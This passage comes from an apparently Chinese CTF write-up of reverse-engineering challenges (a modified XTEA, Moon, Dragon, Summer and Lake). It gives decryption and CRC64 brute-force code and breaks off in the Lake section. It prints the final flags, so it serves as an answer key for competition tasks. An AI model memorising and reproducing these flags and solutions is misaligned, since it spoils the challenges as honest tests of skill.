operator\">-</span> <span class=\"token number\">1f</span>5fe6 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">616</span>d5f72 <span class=\"token operator\">+</span> faff3738 <span class=\"token operator\">=</span> <span class=\"token number\">15</span>c6c96aa\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">5</span>c6c96aa <span class=\"token operator\">^</span> <span class=\"token number\">23235566</span> <span class=\"token operator\">=</span> <span class=\"token number\">7f</span>4fc3cc\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7f</span>4fc3cc <span class=\"token operator\">^</span> <span class=\"token number\">3</span>c28f71e <span class=\"token operator\">=</span> <span class=\"token number\">436734</span>d2\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">436734</span>d2 <span class=\"token operator\">+</span> f580d1d8 <span class=\"token operator\">=</span> <span class=\"token number\">138e806</span>aa</code></pre>\n\n<p>通过观察可以发现是一个魔改的XTea加密。</p>\n<p>通过对比标准XTea加密流程，可以得到里面参与计算的4个key值 <strong>{0x776f6853,0x656b616d,0x616d5f72,0x74696564}</strong> 以及delta值 <strong>0x5f5fe6e7</strong></p>\n<p>写出对应加密的c++代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">void</span> <span class=\"token function\">encipher</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">uint32_t</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint32_t</span> v0 <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> v1 <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> sum <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> delta <span class=\"token operator\">=</span> <span class=\"token number\">0x5f5fe6e7</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">72</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">>></span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">^</span> <span class=\"token number\">0x11223344</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>sum <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> sum<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0xabab1212</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v0 <span class=\"token operator\">+=</span> tmp2<span class=\"token punctuation\">;</span>\n        sum <span class=\"token operator\">+=</span> delta<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">^</span> <span class=\"token number\">0x55667788</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> sum<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x23235566</span> <span class=\"token operator\">^</span> tmp3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v1 <span class=\"token operator\">+=</span> tmp4<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v0<span class=\"token punctuation\">;</span>\n    v<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">void</span> <span class=\"token function\">decipher</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">uint32_t</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint32_t</span> v0 <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> v1 <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> sum <span class=\"token operator\">=</span> <span class=\"token number\">0x5f5fe6e7</span> <span class=\"token operator\">*</span> <span class=\"token number\">72</span><span class=\"token punctuation\">,</span> delta <span class=\"token operator\">=</span> <span class=\"token number\">0x5f5fe6e7</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">72</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> tmp3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">^</span> <span class=\"token number\">0x55667788</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> sum<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x23235566</span> <span class=\"token operator\">^</span> tmp3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v1 <span class=\"token operator\">-=</span> tmp4<span class=\"token punctuation\">;</span>\n        sum <span class=\"token operator\">-=</span> delta<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">>></span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">^</span> <span class=\"token number\">0x11223344</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>sum <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> sum<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0xabab1212</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v0 <span class=\"token operator\">-=</span> tmp2<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v0<span class=\"token punctuation\">;</span>\n    v<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>提取chal程序中的密文，进行解密即可。</p>\n<p>完整解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">decipher</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">uint32_t</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint32_t</span> v0 <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> v1 <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> sum <span class=\"token operator\">=</span> <span class=\"token number\">0x5f5fe6e7</span> <span class=\"token operator\">*</span> <span class=\"token number\">72</span><span class=\"token punctuation\">,</span> delta <span class=\"token operator\">=</span> <span class=\"token number\">0x5f5fe6e7</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">72</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> tmp3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v0 <span class=\"token operator\">^</span> <span class=\"token number\">0x55667788</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> sum<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x23235566</span> <span class=\"token operator\">^</span> tmp3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v1 <span class=\"token operator\">-=</span> tmp4<span class=\"token punctuation\">;</span>\n        sum <span class=\"token operator\">-=</span> delta<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">>></span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">^</span> <span class=\"token number\">0x11223344</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> tmp2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>sum <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> sum<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0xabab1212</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v0 <span class=\"token operator\">-=</span> tmp2<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v0<span class=\"token punctuation\">;</span>\n    v<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint32_t</span> key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x776f6853</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x656b616d</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x616d5f72</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x74696564</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> Encflag<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x696C2E9A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76ADE8E1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE67D5CA4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C76BD38</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xB7AC0787</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBFEA0C65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01C2FF10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D16FD38</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">decipher</span><span class=\"token punctuation\">(</span>Encflag<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">decipher</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint64_t</span><span class=\"token punctuation\">)</span>Encflag <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">decipher</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint64_t</span><span class=\"token punctuation\">)</span>Encflag <span class=\"token operator\">+</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">decipher</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint64_t</span><span class=\"token punctuation\">)</span>Encflag <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.32s\\n\"</span><span class=\"token punctuation\">,</span> Encflag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>XYCTF{fun_un1c0rn_with_4rm64_VM}</p>\n<h3 id=\"Moon\"><a href=\"#Moon\" class=\"headerlink\" title=\"Moon\"></a>Moon</h3><p>跟到moon.xor_crypt实际加密处。</p>\n<p><img src=\"/images/6-1744626745337-11.png\" loading=\"lazy\"></p>\n<p>发现是进行了单次xor，并加入到一个list中，前后过程不清楚。</p>\n<p>断在xor这个命令，运行附加调试，随便输入一串1</p>\n<p><img src=\"/images/7-1744626745337-12.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/8-1744626745338-15.png\" loading=\"lazy\"></p>\n<p>发现是输入的’1’和一个0x24进行xor，多运行几次发现就是将输入的字符串都异或上一些值。</p>\n<p>直接断在return处，v20是最后将list转成Bytes的结果。</p>\n<p><img src=\"/images/9-1744626745338-13.png\" loading=\"lazy\"></p>\n<p>发现是28长度的一串字节，从0x15开始的，就是我们输入字符串长度以及异或完的结果。</p>\n<p><img src=\"/images/10-1744626745338-14.png\" loading=\"lazy\"></p>\n<p>继续运行会返回到check_flag代码处，底下有一个RichCompare比较两个数据。</p>\n<p><img src=\"/images/11-1744626745338-16.png\" loading=\"lazy\"></p>\n<p>v45可以看到就是将刚刚v20的bytes直接unhex转成了一串字符串。</p>\n<p><img src=\"/images/12-1744626745338-18.png\" loading=\"lazy\"></p>\n<p>那么v9就应该是flag的密文，可以数出一共是要35字节。</p>\n<p><img src=\"/images/13-1744626745338-17.png\" loading=\"lazy\"></p>\n<p>重新调试运行输入35个1，在check_flag开头断点，把输入的字符串全都patch成0。</p>\n<p><img src=\"/images/14-1744626745338-19.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/15-1744626745338-20.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/16-1744626745338-21.png\" loading=\"lazy\"></p>\n<p>最后在RichCompare处就可以得到xor密文的列表。</p>\n<p><img src=\"/images/17-1744626745338-22.png\" loading=\"lazy\"></p>\n<p>将v9的密文与这个数据进行xor即可得到flag。</p>\n<p><img src=\"/images/18-1744626745338-23.png\" loading=\"lazy\"></p>\n<p>flag{but_y0u_l00k3d_up_@t_th3_mOOn}</p>\n<h3 id=\"Dragon\"><a href=\"#Dragon\" class=\"headerlink\" title=\"Dragon\"></a>Dragon</h3><p>.bc 后缀 </p>\n<p>反编译为LLVM IR</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\">llvm<span class=\"token operator\">-</span>dis<span class=\"token operator\">-</span><span class=\"token number\">17</span> Dragon<span class=\"token punctuation\">.</span>bc <span class=\"token operator\">-</span>o Dragon<span class=\"token punctuation\">.</span>ll</code></pre>\n\n<p>分析得知为crc64，以两个为一组进行校验，直接爆破就行</p>\n<pre class=\"language-c++\" data-language=\"c++\"><code class=\"language-c++\">#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;string.h&gt;\n\nuint64_t calculate_crc64_direct(const unsigned char* data, uint64_t length) &#123;\n    uint64_t crc &#x3D; 0xFFFFFFFFFFFFFFFFULL; \n\n    for (uint64_t i &#x3D; 0; i &lt; length; i++) &#123;\n        crc ^&#x3D; ((uint64_t)data[i] &lt;&lt; 56);\n\n        for (uint64_t j &#x3D; 0; j &lt; 8; j++) &#123;\n            if (crc &amp; 0x8000000000000000ULL) &#123; \n                crc &#x3D; (crc &lt;&lt; 1) ^ 0x42F0E1EBA9EA3693ULL; \n            &#125;\n            else &#123;\n                crc &#x3D; crc &lt;&lt; 1;\n            &#125;\n        &#125;\n    &#125;\n\n    return ~crc;\n&#125;\n\nint main() &#123;\n    uint64_t enc[12] &#x3D; &#123;\n       -2565957437423125689, \n        224890624719110086, \n        1357324823849588894, \n        - 8941695979231947288, \n        - 253413330424273460, \n        - 7817463785137710741, \n        - 5620500441869335673, \n        984060876288820705, \n        - 6993555743080142153, \n        - 7892488171899690683, \n        7190415315123037707, \n        - 7218240302740981077\n    &#125;;\n    char flag[25] &#x3D; &#123; 0 &#125;;\n    int flag_index &#x3D; 0;\n\n\n    for (int k &#x3D; 0; k &lt; 12; k++) &#123;\n        uint64_t target_crc &#x3D; enc[k];\n        int found &#x3D; 0;\n        for (unsigned char c1 &#x3D; 32; c1 &lt; 127 &amp;&amp; !found; c1++) &#123;\n            for (unsigned char c2 &#x3D; 32; c2 &lt; 127 &amp;&amp; !found; c2++) &#123;\n                unsigned char test[2] &#x3D; &#123; c1, c2 &#125;;\n                uint64_t crc &#x3D; calculate_crc64_direct(test, 2);\n                if (crc &#x3D;&#x3D; target_crc) &#123;\n                    flag[flag_index++] &#x3D; c1;\n                    flag[flag_index++] &#x3D; c2;\n                    break;\n                &#125;\n            &#125;\n        &#125;\n    &#125;\n\n    flag[flag_index] &#x3D; &#39;\\0&#39;;\n    printf(&quot;Decrypted flag: %s\\n&quot;, flag);\n\n    return 0;\n&#125;\n&#x2F;&#x2F;flag&#123;LLVM_1s_Fun_Ri9h7?&#125;</code></pre>\n\n<h3 id=\"Summer\"><a href=\"#Summer\" class=\"headerlink\" title=\"Summer\"></a>Summer</h3><p>haskell程序</p>\n<p>函数式编程语言,这意味着一切都是惰性计算，什么是惰性计算？ 简单来说就是在调用之前不会对该值进行计算</p>\n<p>浏览 main 函数，可以看到 hs_main 将 ZCMain_main_closure 作为它的参数，它指向 haskell 程序的真正入口点</p>\n<p><img src=\"/images/31-1744626745338-24.png\" loading=\"lazy\"></p>\n<p>ZCMain_main_closure里面我们发现它调用了stg_ap_p_fast，这个是底层函数，主要调用Main_main_closure这个函数</p>\n<p><img src=\"/images/19-1744626745338-25.png\" loading=\"lazy\"></p>\n<p>GHCziInternalziBase也是底层函数，主要关注两个参数</p>\n<p><img src=\"/images/20-1744626745338-26.png\" loading=\"lazy\"></p>\n<p>第一个参数的地址处的函数为打印字符串</p>\n<p><img src=\"/images/21-1744626745338-27.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/22-1744626745338-28.png\" loading=\"lazy\"></p>\n<p>GHCziInternalziList_length 为处理我们的传入的字符串的长度，直接调用的是zdwlenAcc<strong>，</strong>zdwlenAcc 将通过检查下一个是否是列表的末尾来计算 “flagTable” 的长度（这里的”flagTable” 是我自己命名,其实就是存储惰性列表，我们可以根据惰性列表的指针数判断字符串的长度）</p>\n<p><img src=\"/images/23-1744626745338-29.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/24-1744626745338-30.png\" loading=\"lazy\"></p>\n<p>我们这里就用flag进行测试，一方面是为了查看他的返回值</p>\n<p><img src=\"/images/25-1744626745338-31.png\" loading=\"lazy\"></p>\n<p>此时他是将rbx此处(即为惰性列表的末尾)，可以人工数(即为50)</p>\n<p><img src=\"/images/26-1744626745338-32.png\" loading=\"lazy\"></p>\n<p>另外一种为看返回值，第一次断下是返回我们输入字符串的长度，第二次断下是返回密钥的长度，第三次断下是返回密文的长度</p>\n<p><img src=\"/images/27-1744626745338-33.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/28-1744626745338-34.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/29-1744626745338-35.png\" loading=\"lazy\"></p>\n<p>另外一处为GHCziInternalziNum_zdfNumIntzuzdczp，这个也是在网上一篇文章看到的,在<strong>add     rbx, [rax]</strong> 在经过几次迭代后，我可以看到一些字符开始出现，此时我们可以得到密钥为<strong>Klingsor’s_Last_Summer</strong></p>\n<p><img src=\"/images/30-1744626745338-36.png\" loading=\"lazy\"></p>\n<p>我们在.data段得到了密钥，因此我们可以猜测下面可能为密文,并且下面都是指针+元素的存储形式</p>\n<p><img src=\"/images/32-1744626745338-37.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/33-1744626745338-38.png\" loading=\"lazy\"></p>\n<p>然后通过CE调试得到明文和密文，然后得出为rc4+xor</p>\n<p><img src=\"/images/34-1744626745338-39.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/35-1744626745338-40.png\" loading=\"lazy\"></p>\n<p>flag{Us3_H@sk3ll_t0_f1nd_th3_truth_1n_th1s_Summ3R}</p>\n<h3 id=\"Lake\"><a href=\"#Lake\" class=\"headerlink\" title=\"Lake\"></a>Lake</h3><p>单步跟到主函数。</p>\n<p><img src=\"/images/36-1744626745338-41.png\" loading=\"lazy\"></p>\n<p>这边输入字符串后先赋值到了另一个数组，然后进行了一次简易VM计算进行了第一次加密，</p>\n<p><img src=\"/images/37-1744626745338-42.png\" loading=\"lazy\"></p>\n<p>然后接着第二次加密，最后循环比较。</p>\n<p><img src=\"/images/38-1744626745338-44.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/39-1744626745338-43.png\" loading=\"lazy\"></p>\n<p>发现VM只用到了加减和XOR计算，在这三个地方的关键点打断点，输出寄存器和计算流程，这边为了方便直接复制到代码里面解密，将加减断点里面的输出运算符反过来，输出出来的代码直接复制到代码就是进行解密的流程。</p>\n<p><img src=\"/images/40-1744626745338-45.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/41-1744626745338-46.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/42-1744626745338-48.png\" loading=\"lazy\"></p>\n<p>调试输出：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\">Input<span class=\"token punctuation\">[</span><span class=\"token 